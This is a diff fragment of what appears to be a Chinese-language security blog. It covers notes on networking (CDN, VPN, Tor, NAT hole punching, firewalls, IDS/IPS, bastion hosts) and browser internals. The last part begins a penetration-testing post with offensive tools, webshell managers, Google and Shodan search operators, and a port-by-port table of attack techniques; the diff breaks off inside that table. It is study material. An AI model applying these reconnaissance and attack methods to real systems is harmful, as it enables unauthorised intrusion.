+<h3 id="CDN"><a href="#CDN" class="headerlink" title="CDN"></a>CDN</h3><p>内容分发网络，是一种网络模型。通过设置下属缓冲服务器，也叫边缘服务器，即接近用户的服务器（区别于镜像服务器，只有部分内容，有额外操作），来缓解用户对主服务器的流量请求；</p>
+<ul>
+<li><p><strong>过程</strong>：源服务器通过HTTP包中的<code>cache-control</code>字段来决定内容的缓存形式（是否保存，多长时间等）。对于静态内容来说：初始时源服务器将内容push给CDN服务器，之后用户向CDN请求，如果CDN中没有用户索要内容，则先向源服务器pull内容，之后再分发；而对于动态内容来说，只有一小部分能够设置成由CDN提供</p>
+</li>
+<li><p><strong>防御DDOS</strong>：为防止某一个服务器流量过高时，会将其部分流量转移到其他服务器上（负载均衡）。在这之中有的采用任播技术，将所有的CDN服务器都共享一个IP，这样其中一个出问题了，就会请求地理上最近的其他CDN，需要专门的负载均衡系统</p>
+</li>
+<li><p><strong>用处</strong>：CDN会对包进行处理，去除不必要内容，来减少包大小，加速用户；减少传输距离，即降低了网络带宽费用，降低服务器方费用</p>
+</li>
+</ul>
+<p>根据CDN服务器的所属分为：专用CDN、第三方CDN；</p>
+<p>CDN服务器安置原则：</p>
+<ol>
+<li>在ISP（互联网服务提供商）处架设CDN集群</li>
+<li>在关键的IXP（因特网交换点）先放置CDN，之后邀请ISP入驻</li>
+<li>根据地理位置和地区流量检测选择布置</li>
+</ol>
+<hr>
+<h3 id="虚拟机网络配置"><a href="#虚拟机网络配置" class="headerlink" title="虚拟机网络配置"></a>虚拟机网络配置</h3><ul>
+<li><p><strong>NAT</strong>（默认）：内部设置分配私有地址，外网无法访问；在每个虚拟机中虚拟机软件会创建一个默认网关（IP固定），之后虚拟机上网流量必定经过本网关，再到宿主机，因此各个虚拟机之间无法交流；</p>
+<p>宿主相对于虚拟机来说是外网，虚拟机可以访问宿主，但不能反过来</p>
+</li>
+<li><p><strong>NAT网络&#x2F;模式</strong>：虚拟机之间可以相互连接，相较于NAT来说，有一个虚拟网关、DHCP、交换机将各个虚拟机存放在同一个网络之中，可以访问互联网；搭建靶场！！！</p>
+</li>
+<li><p><strong>桥接</strong>：虚拟机与宿主机平级，会占用多个宿主网关的分配地址，之间可以互ping</p>
+</li>
+<li><p><strong>内部网络</strong>：虚拟机可以互通，但是无法与宿主交流，相当于虚拟机们自己在一个独立的网络中；如果要互ping，需要提前配置网络</p>
+</li>
+<li><p><strong>仅主机模式</strong>：相较于内部网络，会自动分配IP地址（有DHCP），而且可以与宿主互ping，但是不能上网</p>
+</li>
+</ul>
+<hr>
+<h3 id="VPN"><a href="#VPN" class="headerlink" title="VPN"></a>VPN</h3><p>虚拟专用网络VPN，旨在提供一种安全连接到网络服务器的方式；</p>
+<p>从两端类型来说分为：</p>
+<ul>
+<li><p>站点对站点VPN：两端的地点相对固定；</p>
+</li>
+<li><p>客户端对站点VPN&#x2F;远程登陆VPN：全隧道模式（所有数据都通过）+半隧道模式（部分数据通过）；</p>
+</li>
+</ul>
+<p>加密方式：AES+3DES；保护完整性：Hash；认证：PSK+RSA</p>
+<p>根据使用的协议：IPsec VPN和SSL&#x2F;TLS VPN</p>
+<ul>
+<li><p><strong>IPsec VPN</strong>：</p>
+<p>IPsec协议位于网络层，多用于站点对站点传输；其VPN有两个主要模式：传输模式（也叫半隧道模式）与隧道模式，在传输模式种并非所有的数据都会经过加密，而后者则会全部加密甚至是IP头。</p>
+<p>需要网络中设备安装相应软件并经过身份验证、使得网络管理可见性更广（更底层）</p>
+</li>
+<li><p><strong>SSL VPN</strong>：</p>
+<p>SSL&#x2F;TLS位于应用层与传输层之间，多用于客户端对站点传输；其VPN模式：门户模式（特定网页或Web应用）和隧道模式（甚至可以访问非Web应用）；</p>
+<p>SSL协议广泛应用于浏览器中（多亏HTTPS）因此部署成本较低，只需开放443端口、可以部署在内网中的任一个节点上，移动性强、缺少身份验证可能有安全问题、管理繁琐，需要管理员设置模式</p>
+</li>
+</ul>
+<hr>
+<h3 id="Tor"><a href="#Tor" class="headerlink" title="Tor"></a>Tor</h3><p>洋葱网络&#x2F;路由，一种“代理节点快速动态变化的加密三重代理”，相当于多重VPN；默认情况下Tor通过3个中继器进行跳转：Guard中继器、Middle中继器、Exit中继器。</p>
+<ul>
+<li><p><strong>中继器</strong>：当Alice想要访问Bob时，会在Tor服务器中选择上述三种中继器各一个，而且会定时重组选择新的中继器。为了防止所有的Tor中继器被阻塞，每次只会给用户一小部分的中继器信息。</p>
+</li>
+<li><p><strong>加密过程</strong>：Alice与Guard中继器借助Curve25519椭圆曲线生成一个对称密钥key1，之后Alice使用Guard中继器作为加密跳板来与Middle中继器继续生成key2，以此类推。</p>
+<p>最后Alice有了3把key，每当Alice想要访问Bob时，会依次使用key1、key2、key3对数据包进行加密，每经过一个中继器就解一次密，也就是Exit中继器能看到最终传输内容</p>
+</li>
+</ul>
+<hr>
+<h3 id="P2P"><a href="#P2P" class="headerlink" title="P2P"></a>P2P</h3><p>peer to peer，即点对点技术，又叫做互联网络对等技术。每个结点即能充当服务器又能充当客户，基本不存在带宽问题；为实现跨内网交流，要将内网IP更换为公网IP（NAT），从而到达另一个内网；</p>
+<p><strong>NAT</strong>：</p>
+<p>网络地址转换技术，是一种将数据包中IP地址更换为其他IP地址的功能，常由路由器或防火墙实现；目前代指动态NAT（即NAPT），不仅会改IP地址，还能改变数据报的TCP&#x2F;UDP端口</p>
+<p>术语：内部Tuple、外部Tuple、目标Tuple、打洞hole punch；Tuple&#x3D;IP+Port</p>
+<ol>
+<li>完全锥形NAT：传统NAT，内部Tuple单独占一个外部Tuple</li>
+<li>地址限制型锥型NAT：在锥型基础上，只有之前内部主机联系过的IP才能借助之前的外部Tuple联系，只能发送UDP报文</li>
+<li>端口限制圆锥型NAT：在地址限制型基础上，外部机器B想要与A联系，就要用A之前联系B时的目标Tuple（Ip+端口）向外部Tuple通信</li>
+<li>对称型NAT：内外交流双方构成的【内部Tuple-目标Tuple】对，单独占用NAT后的一个外部Tuple；而外部IP也只能通过该固定的<strong>外部Tuple</strong>来访问内部；即不仅限制了外部的IP和端口，也限制了内部的IP和端口</li>
+</ol>
+<p><strong>NAT穿透&#x2F;打洞</strong>：</p>
+<p>有了NAT技术之后，任意两个在内网的客户端想要通信，就要建立隧道&#x2F;打洞</p>
+<ul>
+<li>1-1、1-2、1-3、1-4打洞：中间服务器C把A和B的外部Turple相互告诉，任意外部都可联系内部</li>
+<li>2-2、2-3、2-4、3-3打洞：先同上，由于IP地址受限，因此需要A直接先向B发送连接（A开了一个针对B的口），之后A通过C向B发送邀请（B此时是没有与A连接的，因为B之前没有连过A），让B也直接向A发送邀请（B开了一个针对A的口，两端成功连接）；根据类型指定IP或Port</li>
+<li>3-4、4-4常规方法无法打洞</li>
+</ul>
+<blockquote>
+<p>更多细节参考<span class="exturl" data-url="aHR0cHM6Ly9qdWVqaW4uY24vcG9zdC82ODQ0OTA0MDk4NTcyMDA5NDg1">NAT基本原理及穿透详解(打洞)<i class="fa fa-external-link-alt"></i></span></p>
+</blockquote>
+<p><strong>BitTorrent</strong>：</p>
+<p>一种用于文件分发的流行P2P协议，会将文件划分为大小相等的n块</p>
+<ul>
+<li><p><strong>洪流(torrent）</strong>：是参与一个特定文件分发的集合，每个个体叫对等方，以等长文件块（256KB）为单位</p>
+</li>
+<li><p><strong>追踪器（tracker）</strong>：划分洪流，登记新来的对等方，将对等方的IP发送给新来的（杂p2p，并不是非常的对等，因为tracker也需要服务器）</p>
+</li>
+<li><p><strong>种子</strong>：制作<code>.torrent</code>文件，其中包含Tracker服务器地址、文件大小、文件名、块大小等</p>
+<p>在拿到之后，会先连接Tracker服务器，之后验证缺少信息并交换信息</p>
+</li>
+<li><p><strong>磁力链接</strong>：格式<code>magnet:?xt=urn:bith:~~~~</code>后面跟一串40位16进制的数字；<code>magnet</code>协议名，<code>xt</code>表示资源定位点，<code>urn:bith</code>表示Hash名，采用URN来定位资源，Hash值即为资源的唯一命名</p>
+</li>
+<li><p><strong>最稀缺优先</strong>：具有该洪流中的块列表，资源数最少的块，最先互传；</p>
+</li>
+<li><p><strong>一报还一报</strong>：向我传送速率最高的对等方获得我方的优先权，规定n个疏通，剩余的阻塞</p>
+</li>
+</ul>
+<p>P2P应用：分布式计算（区块链）、文件共享、流媒体、IP层语音通信（VoIP）、游戏平台</p>
+<hr>
+<h3 id="防火墙"><a href="#防火墙" class="headerlink" title="防火墙"></a>防火墙</h3><p>Firewall，作用：限制外来用户、限定用户访问特定站点。可以在单独的硬件上，也可以作为软件；作为硬件一般叫做网络防火墙，需要针对广泛的连接进行配置，而后者又叫软件&#x2F;主机防火墙，可以针对单独的机器设备进行定制。</p>
+<ul>
+<li><p>两种分段模型：</p>
+<ul>
+<li><p>外部网络—屏蔽主机防火墙—内部网络；</p>
+</li>
+<li><p>外部网络—屏蔽路由器—边界网络&#x3D;DMZ隔离区—屏蔽路由器—内部网络</p>
+</li>
+</ul>
+</li>
+<li><p>过滤标准：源IP、目标IP、内容、协议</p>
+</li>
+<li><p><strong>工作模式</strong>：</p>
+<ul>
+<li>路由&#x2F;网关模式：将防火墙当作路由器使用，内外接口处于不同的子网之中，需要更改网络拓扑</li>
+<li>透明模式&#x2F;桥模式：将防火墙当作交换机，类似于路由器中的仅接内部网，可以互相通信，无IP</li>
+<li>混合模式：防火墙1网关模式，防火墙2桥模式，之后连接防火墙，防火墙1启动VRRP（虚拟路由器冗余协议）进行备份</li>
+</ul>
+</li>
+<li><p><strong>FireWall类型</strong>：</p>
+<ul>
+<li>静态包过滤&#x2F;无状态检测防火墙：运行于OSI的网络层；类似于HTTP的无状态，每一个数据包都需要检查，因此对手动创建的接入控制列表要求较高</li>
+<li>电路级网关防火墙：运行在会话层；连接一段时间后仍无异样，就停止监视</li>
+<li>动态包过滤&#x2F;状态检测防火墙：作用域传输层及以上；能够监控持续的连接</li>
+<li>代理防火墙&#x2F;应用层防火墙：运行在应用层；相当于有代理作用的防火墙</li>
+<li>混合型：不多bb</li>
+</ul>
+</li>
+</ul>
+<p><strong>WAF</strong>：Web应用防火墙，过滤监视HTTP通信来保护Web应用程序；应用层防御；负安全模型（黑名单）&#x2F;肯安全模型（白名单）；预防SQL注入、XSS、文件上传、第七层Dos攻击等</p>
+<p>基于网络的WAF—基于主机的WAF：专门的硬件—作为软件集成，消耗本地资源</p>
+<p>基于云的WAF：云服务商将对去到服务器的流量进行检测</p>
+<hr>
+<h3 id="IDS"><a href="#IDS" class="headerlink" title="IDS"></a>IDS</h3><p>入侵检测系统；对攻击、恶意流量、木马进行检测并发出警告；旁路部署在需要关注的链路上；</p>
+<ul>
+<li><p><strong>CIDF体系</strong>：为IDS通用模型，包括事件产生器+事件数据库+事件分析器+响应单元</p>
+<ol>
+<li><p>事件产生器搜集信息数据，并将其转换为GIDO（通用入侵检测对象）标准格式转交给其他组件</p>
+</li>
+<li><p>事件分析器：接受GIDO，并判断是否构成威胁</p>
+</li>
+<li><p>事件数据库：存储各种事件</p>
+</li>
+<li><p>响应单元：根据GIDO作出反应，终止进程、切断链接、报警等</p>
+</li>
+</ol>
+</li>
+<li><p><strong>根据数据源的分类</strong>：</p>
+<ol>
+<li>HIDS：基于主机，数据来源有系统&#x2F;应用日志、审计日志、端口调用情况等</li>
+<li>NIDS：基于网络，对网络中的数据包进行监测分析</li>
+<li>DIDS：分布式，高层次IDS接受低层次的IDS信息</li>
+</ol>
+</li>
+<li><p><strong>根据检测方法的分类</strong>：</p>
+<ol>
+<li>误用检测系统：根据已有库中的攻击模式，对外来入侵判断类型，进行特征模式匹配或借助专家系统判断；误报率低、要求不高、只针对已知攻击</li>
+<li>异常检测系统：设定标准与阈值，当超过该标准时就警报；误报率不易控制、大量信息特征采集</li>
+<li>混合检测系统：不多bb</li>
+</ol>
+</li>
+<li><p>根据响应方式分类：实时监测、非实时检测</p>
+</li>
+<li><p><strong>误用检测分析方法</strong>：</p>
+<ol>
+<li>模式匹配：依赖于模式库，模式库中存储入侵特征</li>
+<li>专辑系统：专家知识库，形成IF-THEN规则</li>
+<li>状态转换：状态转换图，将入侵过程看作一个行为序列进行分析</li>
+<li>基于信誉检测：检测IP、DNS等是否上过黑名单</li>
+</ol>
+</li>
+<li><p><strong>异常检测方法</strong>：贝叶斯统计、机器学习、神经网络</p>
+</li>
+</ul>
+<p><strong>IPS</strong>：入侵防御系统，区别于IDS，在检测到威胁时，能够自动阻止攻击并采取行动。由于需要流量经过因此需要串行部署。检测方法与IDS相似，这里不多冗余</p>
+<p>根据安装的宿主分为：网络入侵防御系统NIPS、主机入侵防御系统HIPS，前者检测分析流量，后者监测文件进程</p>
+<ul>
+<li>核心组件如下：<ul>
+<li>签名库：存放已知攻击特征</li>
+<li>异常检测引擎：检测未知攻击和异常行为</li>
+<li>阻止引擎：根据检测到的类型及威胁等级来才需相应的措施</li>
+<li>管理控制台：配置管理IPS</li>
+<li>日志报告系统：记录IPS活动，生成报告并分析数据</li>
+</ul>
+</li>
+</ul>
+<hr>
+<h3 id="堡垒机"><a href="#堡垒机" class="headerlink" title="堡垒机"></a>堡垒机</h3><p>也叫做运维审计系统，是一台具备强大防御功能和安全审计功能的服务器，说人话就是控制账户及权限，并记录干了什么的东西。</p>
+<ul>
+<li><p><strong>核心功能&#x2F;理念4A</strong>：认证Authen、账号Account、授权Authorize、审计Audit</p>
+</li>
+<li><p><strong>目标5W</strong>：What、Which、Where、Who、When即谁在什么时候，在哪个位置，能够干什么，并且它干了什么</p>
+</li>
+<li><p><strong>模块</strong>：</p>
+<ol>
+<li>运维平台：RDP&#x2F;VNC运维；SSH&#x2F;Telnet运维；SFTP&#x2F;FTP运维；数据库运维；Web系统运维；远程应用运维；</li>
+<li>管理平台：三权分立；身份鉴别；主机管理；密码托管；运维监控；电子工单</li>
+<li>自动化平台：自动改密；自动运维；自动收集；自动授权；自动备份；自动告警</li>
+<li>控制平台：IP防火墙；命令防火墙；访问控制；传输控制；会话阻断；运维审批</li>
+<li>审计平台：命令记录；文字记录；SQL记录；文件保存；全文检索；审计报表</li>
+</ol>
+</li>
+<li><p><strong>身份认证方式</strong>：本地认证（直接账密）、远程认证（远程账密）、双因子认证（验证码）、第三方认证（其他绑定的账密）</p>
+</li>
+<li><p><strong>运维方式</strong>：B&#x2F;S（借浏览器部署控制）、C&#x2F;S（客户端）、H5（页面登录控制）、网关</p>
+</li>
+<li><p><strong>部署方式</strong>：单机（旁挂在交换机旁）、HA高可靠部署（比前者多一个备份，且共用一个IP）、异地同步部署（多地多台）、集群部署（抽两个堡垒机当总的，一主一备）</p>
+</li>
+</ul>
+]]></content>
+      <categories>
+        <category>网络安全</category>
+      </categories>
+      <tags>
+        <tag>网络</tag>
+      </tags>
+  </entry>
+  <entry>
+    <title>浏览器简介</title>
+    <url>/2023/10/07/%E6%B5%8F%E8%A7%88%E5%99%A8%E7%AE%80%E4%BB%8B/</url>
+    <content><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="\assets\css\APlayer.min.css"><script src="\assets\js\APlayer.min.js" class="aplayer-secondary-script-marker"></script><script class="meting-secondary-script-marker" src="\assets\js\Meting.min.js"></script><p>摘要：大致讲解浏览器有关内容，内核、搜索引擎、安全机制等</p>
+<span id="more"></span>
+
+<p>目前的浏览器基本均为多进程浏览器，即将许多功能单独分离出来，包括但不限于：浏览器主进程、插件进程、渲染进程、GPU进程、网络进程等，各个进程之间采用IPC进行通信。</p>
+<p><span class="exturl" data-url="aHR0cHM6Ly96aHVhbmxhbi56aGlodS5jb20vcC80NzQwNzM5OA==">图解浏览器的基本工作原理 - 知乎 (zhihu.com)<i class="fa fa-external-link-alt"></i></span></p>
+<p><strong>导航过程</strong>：</p>
+<ol>
+<li><p>处理用户输入：浏览器进程中的UI线程负责判断其内容是地址还是其他东西，并决定是否发起网络请求</p>
+</li>
+<li><p>页面资源请求：浏览器主进程通过IPC把URL请求发送给网络进程，发起真正的URL请求</p>
+<blockquote>
+<p>先查找本地缓存资源，没有的话就先查找Host文件，没有目标再发送DNS请求等其他过程</p>
+</blockquote>
+</li>
+<li><p>响应数据处理：网络线程根据接收到的<code>Content-Type</code>来判断返回值类型，并进行安全检查之后再根据此项发送给渲染进程等其他进程</p>
+</li>
+<li><p>准备渲染过程：绝大多数返回内容都是页面，交给渲染进程处理</p>
+</li>
+<li><p>页面处理：渲染引擎与JS引擎共同处理页面并将结果呈现</p>
+</li>
+</ol>
+<p><strong>搜索引擎</strong>：</p>
+<ul>
+<li><p>搜索引擎结构：搜索器（蜘蛛）—分析器（NLP处理）—索引器（建立索引）—检索器（查找文档）—用户接口</p>
+<blockquote>
+<p>爬虫抓取策略：DFS、BFS、最佳优先搜索（贪心取优先相关度高）、反向链接搜索（由其他网站指向）、OPIC策略、大站优先策略等</p>
+</blockquote>
+</li>
+<li><p>工作流程：爬行抓取—建立索引（常用倒排索引）—搜索词处理—排序</p>
+</li>
+<li><p>常见的类别：元搜索引擎（将搜索请求发送给其他搜索引擎，之后再综合排序；dogpile、All4one、webcrawler）、全文搜索引擎（baidu、google等在web内容及标题中搜索）、目录搜索引擎（逐级向下选择）、垂直搜索引擎（专注特定领域）</p>
+</li>
+</ul>
+<p><strong>渲染引擎</strong>：用于获取网页的内容（HTML等），整理排版（CSS），然后显示；目前的浏览器引擎主要指的就是渲染引擎，而JS引擎通常作为渲染引擎的一部分，下面是一些常见的渲染引擎：</p>
+<ul>
+<li>Geocko：火狐浏览器；开源；</li>
+<li>Trident：IE浏览器、世界之窗；</li>
+<li>Webkit：Safari浏览器；基于KHTML研发，开源；</li>
+<li>Blink：google，edge，Opera浏览器；Google基于webkit研发；开源；</li>
+</ul>
+<p><strong>渲染过程</strong>：<span class="exturl" data-url="aHR0cHM6Ly9qdWVqaW4uY24vcG9zdC82ODQ0OTAzODc3MzE0MTAxMjU1">10分钟看懂浏览器的渲染过程及优化 - 掘金 (juejin.cn)<i class="fa fa-external-link-alt"></i></span></p>
+<ol>
+<li><p>解析HTML，生成HTML DOM树：</p>
+<p>编码转换——标签令牌化——生成节点对象——节点对象构建成树形结构</p>
+</li>
+<li><p>碰到CSS，生成CSSOM树：同上</p>
+<blockquote>
+<p>碰到JS代码时会暂停进行，转交给JS引擎解析加载代码，有可能会改变DOM树结构</p>
+</blockquote>
+</li>
+<li><p>合并生成Render tree，即渲染树：将前面两者结合</p>
+</li>
+<li><p>Layout，遍历渲染树，计算盒子模型详细信息，即每个节点在浏览器窗口的确切位置与大小</p>
+<blockquote>
+<p>盒子模型：Content（内容）—&gt;Padding（内边距）—&gt;Border（边框）—&gt;Margin（外边框）</p>
+<img src="https://img1.imgtp.com/2023/10/06/XERZIozg.png" alt="box" style="zoom: 80%;" />
+</blockquote>
+</li>
+<li><p>Paint，绘制页面，绘制时间与CSS复杂度成正比</p>
+</li>
+</ol>
+<p>渲染引擎通常以一个进程的形式存在，其下面还包括许多线程，其中的常驻线程有：GUI渲染线程、JS引擎线程、事件触发线程、定时器线程、HTTP请求线程等</p>
+<p><strong>JS引擎</strong>：解析JS（翻译为机器语言）来实现网页的动态效果，可以理解为浏览器中的虚拟机</p>
+<ul>
+<li>SpiderMonkey：鼻祖；后更新为TraceMonkey、JaegerMonkey</li>
+<li>Chakra：微软开发，用于IE；</li>
+<li>JavaScriptCore：用于webkit，Apple开发；</li>
+<li>V8：google基于C++开发，Node.js基于V8引擎开发；</li>
+<li>流程：JS代码解析为抽象语法树（ATS）——基于AST解释器将其转换为虚拟机字节码——优化编译器将部分函数优化为本地机器指令执行</li>
+</ul>
+<p><strong>安全机制</strong>：<span class="exturl" data-url="aHR0cHM6Ly93d3cuZnJlZWJ1Zi5jb20vc2VjdG9vbC8zMDM1NTEuaHRtbA==">WEB安全-浏览器的几种防护策略 - FreeBuf网络安全行业门户<i class="fa fa-external-link-alt"></i></span></p>
+<ul>
+<li><p>同源策略：防止A站的JS修改B站的页面，对于js来说只有同一IP、同一端口、同一协议才能够算作是同源。</p>
+<p>不受限制的内容：页面中的链接、重定向、表单提交、跨域资源的引入</p>
+<p>进行跨域：<strong>JSONP</strong>（服务端有专门的JSONP请求接口，可以接受JSON格式的参数，并返回该参数的执行结果）、<strong>CORS</strong>（允许浏览器向跨源服务器发出XMLHttpRequest请求）、<strong>Nginx</strong>反向代理可以跨域访问</p>
+</li>
+<li><p>内容安全策略CSP：开发者在规定浏览器对于危险资源不能加载执行，即有漏洞，但是在该客户端上不被允许执行</p>
+</li>
+<li><p>沙箱机制：至少会有两个进程出现，一个代理进程一个目标进程，前者与后者之间建立IPC通道并接受各种请求，待病毒特性充分暴露之后会进行回滚机制，将病毒的痕迹和动作抹去</p>
+</li>
+<li><p>恶意网站拦截：拦截的大多为挂马网站、诈骗钓鱼网站等。目前大多的浏览器采用的大多基于黑名单制度，该项黑名单定期会从服务器获取。<span class="exturl" data-url="aHR0cHM6Ly9waGlzaHRhbmsub3JnL2luZGV4LnBocA==">PhishTank | Join the fight against phishing<i class="fa fa-external-link-alt"></i></span></p>
+<blockquote>
+<p>EV SSL证书，拥有该证书的网站会在浏览器地址栏中显示为绿色，拥有特别标注</p>
+</blockquote>
+</li>
+</ul>
+]]></content>
+      <tags>
+        <tag>Web</tag>
+        <tag>前端</tag>
+      </tags>
+  </entry>
+  <entry>
     <title>网络基础</title>
     <url>/2023/08/30/%E7%BD%91%E7%BB%9C%E5%9F%BA%E7%A1%80/</url>
-    <content><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="\assets\css\APlayer.min.css"><script src="\assets\js\APlayer.min.js" class="aplayer-secondary-script-marker"></script><script class="meting-secondary-script-marker" src="\assets\js\Meting.min.js"></script><p>一些关于计算鸡网络的一些基础知识，尽量不向网络中的底层涉及，侧重于实际应用。</p>
+    <content><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="\assets\css\APlayer.min.css"><script src="\assets\js\APlayer.min.js" class="aplayer-secondary-script-marker"></script><script class="meting-secondary-script-marker" src="\assets\js\Meting.min.js"></script><p>摘要：一些关于网络的基础知识，尽量不向网络中的底层涉及，侧重于实际用到的</p>
 <span id="more"></span>
 
 <h3 id="0x01-URL"><a href="#0x01-URL" class="headerlink" title="0x01.URL"></a>0x01.URL</h3><pre><code>https://www.example.com:80/path/to/myfile.html?key1=value1&amp;key2=value2#anchor
@@ -5742,225 +5943,789 @@ d15=100011110101100
         <category>计算机基础</category>
       </categories>
       <tags>
-        <tag>网络</tag>
         <tag>基础知识</tag>
+        <tag>网络</tag>
       </tags>
   </entry>
   <entry>
-    <title>网络技术</title>
-    <url>/2023/09/10/%E7%BD%91%E7%BB%9C%E6%8A%80%E6%9C%AF/</url>
-    <content><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="\assets\css\APlayer.min.css"><script src="\assets\js\APlayer.min.js" class="aplayer-secondary-script-marker"></script><script class="meting-secondary-script-marker" src="\assets\js\Meting.min.js"></script><p>介绍一些网络上的重要技术与设备</p>
+    <title>渗透测试</title>
+    <url>/2023/08/26/%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95%E7%AE%80%E4%BB%8B/</url>
+    <content><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="\assets\css\APlayer.min.css"><script src="\assets\js\APlayer.min.js" class="aplayer-secondary-script-marker"></script><script class="meting-secondary-script-marker" src="\assets\js\Meting.min.js"></script><p>摘要：侧重于渗透过程的内网渗透，仅提供参考，必定会有讲解不清的内容，如有任何错误，欢迎批评指正。</p>
 <span id="more"></span>
 
-<h3 id="CDN"><a href="#CDN" class="headerlink" title="CDN"></a>CDN</h3><p>内容分发网络，是一种网络模型。通过设置下属缓冲服务器，也叫边缘服务器，即接近用户的服务器（区别于镜像服务器，只有部分内容，有额外操作），来缓解用户对主服务器的流量请求；</p>
+<p><strong>常用工具</strong>：</p>
 <ul>
-<li><p><strong>过程</strong>：源服务器通过HTTP包中的<code>cache-control</code>字段来决定内容的缓存形式（是否保存，多长时间等）。对于静态内容来说：初始时源服务器将内容push给CDN服务器，之后用户向CDN请求，如果CDN中没有用户索要内容，则先向源服务器pull内容，之后再分发；而对于动态内容来说，只有一小部分能够设置成由CDN提供</p>
+<li>杂烩：Metaspolit（chcp 65001解决部分乱码问题，Ruby+PostgreSQL（对象关系型数据库））、Cobalstrike—团队型MSF，有客户端和服务端部署，GUI界面、BurpSuite（外网攻击通用）；</li>
+<li>漏洞扫描工具：AWVS、AppScan；</li>
+<li>抓包：Fiddler、WinSock Expert—抓指定进程包、Wireshark—抓包但侧重分析、charles、tcpdump；</li>
+<li>Webshell木马与链接：behinder冰蝎、antsword蚁剑、godzilla哥斯拉；</li>
+<li>其他：Nmap—扫描、minikatz—后渗透密码、DirBuster—探测目录与隐藏文件、御剑—网站端口、目录扫描工具；</li>
+</ul>
+<p><strong>常用概念及黑话</strong>：</p>
+<ul>
+<li>正向shell：控制端主动连接被控端</li>
+<li>反向&#x2F;反弹shell：由被控制端主动发起连接</li>
+<li>彩虹表：属于一种字典，但是内容为hash过的东西，而字典一般存储明文</li>
+<li>C2：command&amp;control</li>
+<li>Poc：漏洞检测</li>
+<li>EXP：漏洞利用，其中包含payload</li>
+<li>Payload：指的是在目标系统中真正执行的代码</li>
+<li>shellcode：一种payload，用于建立正向shell</li>
+<li>Bypass：绕过</li>
+<li>WAF：web application firewall</li>
+<li>Webshell：以脚本语言编写的文件，能够给攻击者返回后门</li>
+<li>0day：漏洞周期：未知漏洞—0day—补丁发布后成为1day—历史漏洞</li>
+<li>Fuzz：模糊测试，自动化黑盒漏洞检测</li>
+<li>APT：高级持续性威胁，相较于普通渗透周期更长，危害更大</li>
+<li>MIMT：中间人攻击</li>
+</ul>
+<h3 id="做功课（打点）"><a href="#做功课（打点）" class="headerlink" title="做功课（打点）"></a>做功课（打点）</h3><p><strong>信息搜集</strong>：</p>
+<p>Java三大开发框架：Spring（boot、cloud、security）、struct2、hibernate</p>
+<p>Python开发框架：Flask、Django、fastapi</p>
+<p>PHP开发框架：Laravel、ThinkPHP、CakePHP</p>
+<p>Golang开发框架：Fiber</p>
+<ul>
+<li><p>Google hacking：</p>
+<pre><code>&quot;balabala&quot;----------------完全匹配搜索包括顺序啥的
+a*b-----------------------即a什么b，中间有一个词未知
+&quot;a&quot;+&quot;b&quot;-------------------同时有a和b（AND）
+&quot;a&quot;|&quot;b&quot;-------------------有a或b（OR）
+&quot;a&quot;-&quot;b&quot;-------------------只有a不能包含b（NOT）
+site:bilibili.com---------指定域名
+inurl:login---------------指定网址中必须出现“login”
+intitle:后台登陆-----------指定搜索结果标题中必须有“后台登陆”
+intext:阿里巴巴------------指定搜索内容中必有“阿里巴巴”
+“三体”filetype/ext:txt----指定搜索“三体”的txt文件
+其他可在GoogleHackingDateBase（GHDB）中了解（狗头）
+</code></pre>
 </li>
-<li><p><strong>防御DDOS</strong>：为防止某一个服务器流量过高时，会将其部分流量转移到其他服务器上（负载均衡）。在这之中有的采用任播技术，将所有的CDN服务器都共享一个IP，这样其中一个出问题了，就会请求地理上最近的其他CDN，需要专门的负载均衡系统</p>
-</li>
-<li><p><strong>用处</strong>：CDN会对包进行处理，去除不必要内容，来减少包大小，加速用户；减少传输距离，即降低了网络带宽费用，降低服务器方费用</p>
+<li><p>Shodan hacking：</p>
+<p>著名IOT（物联网）搜索引擎，网络空间搜索引擎，搜索联网设备；国内的有：zoomeye和FOFA；Google、百度、bing等都是Web搜索引擎；功能包括但不限于IP搜索、协议搜索、远程登陆等</p>
+<p>搜索限定词：country:CN (限定服务器国家)、product:”nginx”+version:”xxxx”(搜索特定产品&#x2F;服务的特定版本)、os:”Windows 7 or 8”(搜索操作系统)、net:192.168.1.1(搜索特定网段地址)、port:500(搜索特定的端口)、hostname:.edu(搜索指定主机名&#x2F;域名)</p>
 </li>
 </ul>
-<p>根据CDN服务器的所属分为：专用CDN、第三方CDN；</p>
-<p>CDN服务器安置原则：</p>
+<ul>
+<li><p>搜索信息目标：服务器&#x2F;网站&#x2F;域名&#x2F;管理员等；C段扫描：nmap&#x2F;Cwebscan；ping-windows-TTL-128、ping-Linux-TTL-64；wappanalyzer分析网站框架；CMS内容管理系统识别；敏感文件与目录【githack—.git、.svn、御剑后台扫描&#x2F;dirsearch&#x2F;7kbstrom、目录爆破】！！；</p>
+<blockquote>
+<p>在网站中最下方寻找Powered by，有备案的经过一定的等保测试</p>
+</blockquote>
+</li>
+</ul>
+<table>
+<thead>
+<tr>
+<th>端口</th>
+<th>协议&#x2F;应用</th>
+<th>手法</th>
+</tr>
+</thead>
+<tbody><tr>
+<td>TCP&#x2F;20、21</td>
+<td>FTP</td>
+<td>爆破、嗅探、提权、远程代码溢出、vsftpd后门</td>
+</tr>
+<tr>
+<td>TCP&#x2F;22</td>
+<td>SSH</td>
+<td>弱口令爆破、CVE-2018-15473</td>
+</tr>
+<tr>
+<td>TCP&#x2F;23</td>
+<td>Telnet</td>
+<td>弱口令、嗅探</td>
+</tr>
+<tr>
+<td>TCP&#x2F;25</td>
+<td>SMTP简单邮件传输</td>
+<td>枚举、伪造</td>
+</tr>
+<tr>
+<td>UDP&#x2F;53</td>
+<td>DNS域名解析</td>
+<td>DNS劫持、域传送</td>
+</tr>
+<tr>
+<td>67、68</td>
+<td>DHCP</td>
+<td>注入、污染</td>
+</tr>
+<tr>
+<td>UDP&#x2F;69</td>
+<td>TFTP简单文件传输</td>
+<td>文件下载</td>
+</tr>
+<tr>
+<td>TCP&#x2F;80、443</td>
+<td>HTTP&#x2F;S</td>
+<td>web服务</td>
+</tr>
+<tr>
+<td>TCP&#x2F;110</td>
+<td>POP邮局协议</td>
+<td>弱口令、嗅探</td>
+</tr>
+<tr>
+<td>TCP&#x2F;137、139、445</td>
